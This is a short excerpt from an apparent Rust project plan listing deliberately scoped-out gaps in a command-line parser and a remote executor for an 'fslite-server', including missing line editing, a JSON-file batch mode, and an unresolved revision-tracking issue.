- **Known, deliberately documented gaps:** the line grammar has no interactive line editing/history (plain `stdin().lines()`, not `rustyline`) — scoped out to keep dependencies minimal, since the ask was a constrained parser, not a full readline experience. `batch` is not expressible in the line grammar itself (it reads a JSON file via `--file`) since a multi-operation atomic transaction does not fit a single constrained line — this is a deliberate scope boundary, not an oversight. `RemoteExecutor`'s `Read` cannot recover the exact `Revision` from the HTTP response without either an added response header on `fslite-server`'s side or an extra `stat` round trip (Task 7, Step 4's inline note) — flagged as a cross-plan decision point rather than silently guessed.
